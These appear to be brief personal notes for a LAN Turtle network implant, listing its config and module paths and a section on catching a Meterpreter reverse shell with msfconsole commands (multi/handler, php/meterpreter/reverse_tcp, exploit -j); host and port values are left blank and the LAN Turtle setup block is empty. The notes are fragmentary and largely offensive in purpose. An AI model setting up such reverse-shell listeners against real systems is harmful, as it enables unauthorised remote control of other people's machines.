

Network config: 

'/etc/config/network'



Module locations:

'/etc/turtle/modules'

 to start a module from here: ./<module> start
 
 
 
## Modules


### Meterpreter reverse shell

Setting up listener

'''
msfconsole

use exploit/multi/handler

set PAYLOAD php/meterpreter/reverse_tcp

set LPORT/LHOST

exploit -j
'''

Set up LAN Turtle

'''


'''
